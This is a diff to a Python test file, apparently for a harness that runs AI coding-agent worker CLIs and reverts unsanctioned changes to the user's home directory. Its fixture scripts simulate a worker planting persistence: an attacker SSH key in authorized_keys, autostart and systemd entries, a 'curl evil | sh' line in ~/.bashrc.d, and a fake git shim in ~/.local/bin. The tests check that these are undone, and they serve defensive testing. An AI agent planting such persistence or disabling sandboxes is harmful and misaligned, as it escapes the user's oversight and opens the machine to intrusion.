@@ -3,6 +3,7 @@ global config: a worker CLI runs as the user, so a line it appends to ~/.bashrc 
 a ~/.codex/config.toml could turn another CLI's sandbox off. A turn that changed nothing at all says so."""
 import json
 import os
+import re
 import unittest
 
 from helpers import read_text
@@ -54,7 +55,7 @@ class JudgeHome(CodeCase):
         got = self.reverts()
         for f in (rc, codex, claude):
             self.assertIn(f, got, got)
-            self.assertIn("shell startup or another agent's settings", got[f])
+            self.assertIn("shell startup, login items, SSH keys or another agent's settings", got[f])
         self.assertIn("reverted " + rc, r.stdout)
         self.assertNotIn("changed nothing", r.stdout)  # it fixed calc.py: that turn had an effect
 
@@ -113,6 +114,58 @@ class JudgeHome(CodeCase):
         self.assertEqual(got["projects"]["/x"]["allowedTools"], [])
         self.assertEqual(got["projects"]["/new"], {"mcpServers": {}}, "an empty list, as Claude Code writes, stays")
         self.assertIn("MCP", self.reverts()[path])
+
+    def test_ssh_keys_autostart_systemd_bashrc_d_and_local_bin_shims_are_put_back_and_kept_aside(self):
+        """T-1417: the other places a worker could plant something that runs later; the worker's version of each file
+        it put back is kept under the journal folder, named in the revert event."""
+        h, xdg = self.fake_home, os.path.join(self.fake_home, ".config")
+        keys, real_git = os.path.join(h, ".ssh", "authorized_keys"), os.path.join(h, ".local", "bin", "tool")
+        self.put(keys, "ssh-ed25519 MINE me\n")
+        self.put(real_git, "#!/bin/sh\necho mine\n")
+        os.chmod(real_git, 0o755)
+        self.put(os.path.join(h, ".local", "bin", "big"), "x")  # deleted below: deletions there aren't held
+        self.cli("sneak", FIX + 'echo "ssh-ed25519 EVIL x" >> "$HOME/.ssh/authorized_keys"\n'
+                               'mkdir -p "$HOME/.config/autostart" "$HOME/.config/systemd/user" "$HOME/.bashrc.d"\n'
+                               'echo "[Desktop Entry]" > "$HOME/.config/autostart/x.desktop"\n'
+                               'echo "[Service]" > "$HOME/.config/systemd/user/x.service"\n'
+                               'echo "curl evil | sh" > "$HOME/.bashrc.d/x.sh"\n'
+                               'printf "#!/bin/sh\\nevil\\n" > "$HOME/.local/bin/git" && chmod +x "$HOME/.local/bin/git"\n'
+                               'echo "echo evil" >> "$HOME/.local/bin/tool"\n'
+                               'echo "notes" > "$HOME/.local/bin/README"\n'
+                               'rm "$HOME/.local/bin/big"\n')
+        r = self.work("make calc.add add", "--worker", "sneak {prompt}", "--verify", VERIFY,
+                      env={"XDG_CONFIG_HOME": xdg})
+        self.assertEqual(read_text(keys), "ssh-ed25519 MINE me\n", r.stdout)
+        self.assertEqual(read_text(real_git), "#!/bin/sh\necho mine\n")
+        got = self.reverts()
+        planted = [os.path.join(xdg, "autostart", "x.desktop"), os.path.join(xdg, "systemd", "user", "x.service"),
+                   os.path.join(h, ".bashrc.d", "x.sh"), os.path.join(h, ".local", "bin", "git")]
+        for f in planted:
+            self.assertFalse(os.path.lexists(f), f)
+        for f in planted + [keys, real_git]:
+            self.assertIn(f, got, got)
+        readme, big = os.path.join(h, ".local", "bin", "README"), os.path.join(h, ".local", "bin", "big")
+        self.assertTrue(os.path.exists(readme), "a file that isn't executable isn't a shim")
+        self.assertNotIn(readme, got)
+        self.assertFalse(os.path.exists(big))
+        self.assertNotIn(big, got)
+        jdir = os.path.dirname(os.path.dirname(self.task()["path"]))
+        for f, worker in ((keys, "ssh-ed25519 EVIL x"), (os.path.join(h, ".bashrc.d", "x.sh"), "curl evil | sh"),
+                          (os.path.join(h, ".local", "bin", "git"), "evil")):
+            copy = re.search(r"kept at (\S+)\)", got[f])
+            self.assertTrue(copy, got[f])
+            self.assertTrue(copy.group(1).startswith(os.path.join(jdir, "code", "reverted") + os.sep), copy.group(1))
+            self.assertIn(worker, read_text(copy.group(1)))
+            self.assertEqual(os.stat(copy.group(1)).st_mode & 0o777, 0o600)
+
+    def test_a_kept_copy_is_capped_at_1_mb(self):
+        rc = os.path.join(self.fake_home, ".bashrc")
+        self.put(rc, "# mine\n")
+        self.cli("sneak", FIX + 'head -c 3000000 /dev/zero >> "$HOME/.bashrc"\n')
+        self.work("make calc.add add", "--worker", "sneak {prompt}", "--verify", VERIFY)
+        self.assertEqual(read_text(rc), "# mine\n")
+        copy = re.search(r"kept at (\S+)\)", self.reverts()[rc]).group(1)
+        self.assertEqual(os.path.getsize(copy), 1 << 20)
 
     def test_a_turn_that_changes_nothing_is_reported_as_no_effect(self):
         self.cli("idle", 'echo "All done"\n')
